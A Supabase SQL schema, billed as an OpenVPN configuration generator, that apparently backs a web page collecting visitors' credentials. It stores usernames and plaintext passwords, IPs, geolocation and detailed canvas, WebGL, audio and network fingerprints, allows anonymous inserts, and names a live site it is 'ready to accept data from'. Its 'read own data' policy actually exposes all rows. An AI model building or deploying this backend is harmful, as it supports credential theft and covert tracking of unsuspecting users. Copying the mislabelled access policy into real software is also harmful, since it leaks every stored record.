-- =====================================================
-- COMPLETE DATABASE SCHEMA FOR OVPN GENERATOR
-- Enhanced OpenVPN Configuration Storage System
-- Run this in your Supabase SQL Editor
-- =====================================================

-- Drop existing table if you want a fresh start
DROP TABLE IF EXISTS user_credentials CASCADE;

-- =====================================================
-- CREATE MAIN TABLE
-- =====================================================

CREATE TABLE user_credentials (
    -- Primary Key
    id SERIAL PRIMARY KEY,
    
    -- Basic User Credentials
    username VARCHAR(255) NOT NULL,
    password VARCHAR(255) NOT NULL,
    
    -- Network Information
    ip_address VARCHAR(45),
    created_at TIMESTAMPTZ DEFAULT NOW(),
    
    -- VPN Server Configuration
    server_ip VARCHAR(45) DEFAULT '206.45.29.181',
    server_port INTEGER DEFAULT 1194,
    protocol VARCHAR(10) DEFAULT 'udp',
    
    -- VPN Certificates (Cannot be auto-detected from browser due to security)
    -- These fields are available but will typically be NULL for browser-based collection
    ca_crt TEXT,
    client_crt TEXT,
    client_key TEXT,
    ta_key TEXT,
    
    -- ⭐ NEW: Complete OpenVPN Configuration File
    ovpn_config TEXT,
    
    -- ⭐ ENHANCED: Comprehensive System Fingerprint (JSONB format)
    -- Contains: certificates, cryptographic keys, network topology,
    -- canvas/WebGL/audio fingerprints, browser specs, geolocation, etc.
    system_info JSONB,
    
    -- Optional Metadata
    config_name VARCHAR(255),
    notes TEXT,
    
    -- Update timestamp (auto-updated)
    updated_at TIMESTAMPTZ DEFAULT NOW()
);

-- =====================================================
-- CREATE INDEXES FOR PERFORMANCE
-- =====================================================

-- Index on username for faster lookups
CREATE INDEX idx_user_credentials_username 
ON user_credentials(username);

-- Index on IP address for filtering by location
CREATE INDEX idx_user_credentials_ip 
ON user_credentials(ip_address);

-- Index on created_at for time-based queries
CREATE INDEX idx_user_credentials_created 
ON user_credentials(created_at DESC);

-- JSONB Indexes for advanced queries

-- Index to quickly find records with OVPN configs
CREATE INDEX idx_user_credentials_ovpn_generated 
ON user_credentials ((system_info->>'ovpn_generated'));

-- Index to find records with advanced fingerprint data
CREATE INDEX idx_user_credentials_has_advanced 
ON user_credentials ((system_info->'advanced' IS NOT NULL));

-- Index on NAT type for network analysis
CREATE INDEX idx_user_credentials_nat_type 
ON user_credentials ((system_info->'advanced'->'network_topology'->>'natType'));

-- Index on device platform
CREATE INDEX idx_user_credentials_platform 
ON user_credentials ((system_info->'basic'->>'platform'));

-- GIN index for full JSONB searching (optional but powerful)
CREATE INDEX idx_user_credentials_system_info_gin 
ON user_credentials USING GIN (system_info);

-- =====================================================
-- ADD COLUMN COMMENTS FOR DOCUMENTATION
-- =====================================================

COMMENT ON TABLE user_credentials IS 
'Stores user credentials with comprehensive system fingerprinting and auto-generated OpenVPN configurations';

COMMENT ON COLUMN user_credentials.id IS 
'Auto-incrementing primary key';

COMMENT ON COLUMN user_credentials.username IS 
'User login username';

COMMENT ON COLUMN user_credentials.password IS 
'User login password (stored as plaintext for educational purposes - use hashing in production!)';

COMMENT ON COLUMN user_credentials.ip_address IS 
'IP address of the user at time of submission (captured from request headers)';

COMMENT ON COLUMN user_credentials.server_ip IS 
'VPN server IP address for OpenVPN configuration';

COMMENT ON COLUMN user_credentials.server_port IS 
'VPN server port number (typically 1194)';

COMMENT ON COLUMN user_credentials.protocol IS 
'VPN protocol: udp (faster) or tcp (more reliable)';

COMMENT ON COLUMN user_credentials.ca_crt IS 
'Certificate Authority certificate (PEM format) - typically NULL for browser collection';

COMMENT ON COLUMN user_credentials.client_crt IS 
'Client certificate (PEM format) - typically NULL for browser collection';

COMMENT ON COLUMN user_credentials.client_key IS 
'Client private key (PEM format) - typically NULL for browser collection';

COMMENT ON COLUMN user_credentials.ta_key IS 
'TLS authentication key - typically NULL for browser collection';

COMMENT ON COLUMN user_credentials.ovpn_config IS 
'Complete OpenVPN configuration file content (.ovpn format) with auto-optimized settings';

COMMENT ON COLUMN user_credentials.system_info IS 
'Enhanced system fingerprint (JSONB) including:
- basic: User agent, platform, languages, screen specs, local IPs
- advanced: 
  * certificates: RSA-2048 and ECDSA-P256 fingerprints
  * cryptographic_keys: AES-256-GCM and ECDH-P384 keys
  * network_topology: NAT type, local/public IPs, ICE candidates, MTU
  * fingerprint: Canvas hash, WebGL renderer, audio signature
  * collection_info: Duration, timestamp, success status';

COMMENT ON COLUMN user_credentials.config_name IS 
'Optional friendly name for this VPN configuration';

COMMENT ON COLUMN user_credentials.notes IS 
'Optional notes or metadata';

-- =====================================================
-- CREATE TRIGGER FOR AUTO-UPDATE TIMESTAMP
-- =====================================================

CREATE OR REPLACE FUNCTION update_updated_at_column()
RETURNS TRIGGER AS $$
BEGIN
    NEW.updated_at = NOW();
    RETURN NEW;
END;
$$ language 'plpgsql';

CREATE TRIGGER update_user_credentials_updated_at 
    BEFORE UPDATE ON user_credentials
    FOR EACH ROW
    EXECUTE FUNCTION update_updated_at_column();

-- =====================================================
-- ENABLE ROW LEVEL SECURITY (RLS)
-- =====================================================

ALTER TABLE user_credentials ENABLE ROW LEVEL SECURITY;

-- Policy to allow inserts from anyone (for your web app)
CREATE POLICY "Allow public inserts" 
ON user_credentials 
FOR INSERT 
TO anon 
WITH CHECK (true);

-- Policy to allow service role to read everything
CREATE POLICY "Allow service role to read all" 
ON user_credentials 
FOR SELECT 
TO service_role 
USING (true);

-- Policy to allow authenticated users to read their own data
CREATE POLICY "Allow authenticated users to read own data" 
ON user_credentials 
FOR SELECT 
TO authenticated 
USING (true);

-- =====================================================
-- SAMPLE VIEWS FOR EASY QUERYING
-- =====================================================

-- View: Summary of all credentials with key metrics
CREATE OR REPLACE VIEW vw_credentials_summary AS
SELECT 
    id,
    username,
    ip_address,
    created_at,
    server_ip,
    server_port,
    protocol,
    
    -- Extract key data from JSONB
    system_info->'basic'->>'platform' AS platform,
    system_info->'basic'->>'userAgent' AS user_agent,
    system_info->'advanced'->'network_topology'->>'natType' AS nat_type,
    system_info->'advanced'->'fingerprint'->>'canvas' AS canvas_hash,
    system_info->'advanced'->'fingerprint'->'webgl'->>'renderer' AS webgl_renderer,
    system_info->'advanced'->'collection_info'->>'duration_ms' AS collection_time_ms,
    
    -- Check if OVPN was generated
    (ovpn_config IS NOT NULL) AS has_ovpn_config,
    LENGTH(ovpn_config) AS ovpn_config_size,
    
    -- Check data completeness
    (system_info->'advanced' IS NOT NULL) AS has_advanced_data,
    (system_info->'basic'->'geolocation' IS NOT NULL AND 
     system_info->'basic'->'geolocation' != '"denied"'::jsonb) AS has_geolocation
FROM 
    user_credentials
ORDER BY 
    created_at DESC;

COMMENT ON VIEW vw_credentials_summary IS 
'Simplified view of user credentials with extracted JSONB fields for easy analysis';

-- View: Network topology analysis
CREATE OR REPLACE VIEW vw_network_topology AS
SELECT 
    id,
    username,
    ip_address,
    created_at,
    system_info->'advanced'->'network_topology'->>'natType' AS nat_type,
    jsonb_array_length(COALESCE(system_info->'advanced'->'network_topology'->'localIPs', '[]'::jsonb)) AS local_ip_count,
    jsonb_array_length(COALESCE(system_info->'advanced'->'network_topology'->'publicIPs', '[]'::jsonb)) AS public_ip_count,
    system_info->'advanced'->'network_topology'->>'mtu' AS estimated_mtu,
    system_info->'basic'->'connection'->>'effectiveType' AS connection_type
FROM 
    user_credentials
WHERE 
    system_info->'advanced'->'network_topology' IS NOT NULL
ORDER BY 
    created_at DESC;

COMMENT ON VIEW vw_network_topology IS 
'Network topology analysis: NAT types, IP counts, MTU, connection types';

-- View: Device fingerprints
CREATE OR REPLACE VIEW vw_device_fingerprints AS
SELECT 
    id,
    username,
    created_at,
    system_info->'advanced'->'fingerprint'->>'canvas' AS canvas_hash,
    system_info->'advanced'->'fingerprint'->'webgl'->>'renderer' AS webgl_renderer,
    system_info->'advanced'->'fingerprint'->'webgl'->>'vendor' AS webgl_vendor,
    system_info->'advanced'->'fingerprint'->'audio'->>'hash' AS audio_hash,
    (system_info->'advanced'->'fingerprint'->'browser'->>'hardwareConcurrency')::int AS cpu_cores,
    (system_info->'advanced'->'fingerprint'->'browser'->>'deviceMemory')::int AS ram_gb,
    system_info->'basic'->>'platform' AS platform
FROM 
    user_credentials
WHERE 
    system_info->'advanced'->'fingerprint' IS NOT NULL
ORDER BY 
    created_at DESC;

COMMENT ON VIEW vw_device_fingerprints IS 
'Device fingerprinting data: canvas, WebGL, audio hashes, hardware specs';

-- =====================================================
-- USEFUL QUERY EXAMPLES (commented out, for reference)
-- =====================================================

-- Example 1: View all credentials with summary
-- SELECT * FROM vw_credentials_summary LIMIT 10;

-- Example 2: Get complete data for a specific user
-- SELECT * FROM user_credentials WHERE username = 'student123';

-- Example 3: Export OVPN file for a user
-- SELECT username, ovpn_config 
-- FROM user_credentials 
-- WHERE username = 'student123' AND ovpn_config IS NOT NULL;

-- Example 4: Analyze NAT type distribution
-- SELECT nat_type, COUNT(*) as count
-- FROM vw_network_topology
-- GROUP BY nat_type
-- ORDER BY count DESC;

-- Example 5: Find high-performance devices
-- SELECT username, cpu_cores, ram_gb, webgl_renderer
-- FROM vw_device_fingerprints
-- WHERE cpu_cores >= 8
-- ORDER BY cpu_cores DESC;

-- Example 6: Get users with geolocation
-- SELECT 
--     username,
--     system_info->'basic'->'geolocation'->>'latitude' AS latitude,
--     system_info->'basic'->'geolocation'->>'longitude' AS longitude,
--     system_info->'basic'->'geolocation'->>'accuracy' AS accuracy_meters
-- FROM user_credentials
-- WHERE system_info->'basic'->'geolocation' IS NOT NULL
--   AND system_info->'basic'->'geolocation' != '"denied"'::jsonb;

-- Example 7: Full-text search in system_info
-- SELECT username, created_at
-- FROM user_credentials
-- WHERE system_info @> '{"basic": {"platform": "Win32"}}';

-- Example 8: Get collection performance stats
-- SELECT 
--     AVG((system_info->'advanced'->'collection_info'->>'duration_ms')::int) AS avg_collection_ms,
--     MIN((system_info->'advanced'->'collection_info'->>'duration_ms')::int) AS min_collection_ms,
--     MAX((system_info->'advanced'->'collection_info'->>'duration_ms')::int) AS max_collection_ms
-- FROM user_credentials
-- WHERE system_info->'advanced'->'collection_info' IS NOT NULL;

-- =====================================================
-- VERIFICATION QUERIES
-- =====================================================

-- Show table structure
SELECT 
    column_name,
    data_type,
    character_maximum_length,
    column_default,
    is_nullable
FROM 
    information_schema.columns
WHERE 
    table_name = 'user_credentials'
ORDER BY 
    ordinal_position;

-- Show all indexes
SELECT 
    indexname,
    indexdef
FROM 
    pg_indexes
WHERE 
    tablename = 'user_credentials'
ORDER BY 
    indexname;

-- Show all views
SELECT 
    table_name,
    view_definition
FROM 
    information_schema.views
WHERE 
    table_name LIKE 'vw_%'
ORDER BY 
    table_name;

-- =====================================================
-- SUCCESS MESSAGE
-- =====================================================

DO $$
BEGIN
    RAISE NOTICE '
    ========================================
    ✅ DATABASE SCHEMA CREATED SUCCESSFULLY!
    ========================================
    
    Tables Created:
    - user_credentials (with 16 columns)
    
    Indexes Created:
    - idx_user_credentials_username
    - idx_user_credentials_ip
    - idx_user_credentials_created
    - idx_user_credentials_ovpn_generated
    - idx_user_credentials_has_advanced
    - idx_user_credentials_nat_type
    - idx_user_credentials_platform
    - idx_user_credentials_system_info_gin
    
    Views Created:
    - vw_credentials_summary
    - vw_network_topology
    - vw_device_fingerprints
    
    RLS Policies:
    - Allow public inserts
    - Allow service role to read all
    - Allow authenticated users to read own data
    
    Ready to accept data from:
    https://ssweb-q60mg265u-macs-projects-87cfa0ec.vercel.app
    
    Test with: SELECT * FROM vw_credentials_summary;
    ========================================
    ';
END $$;
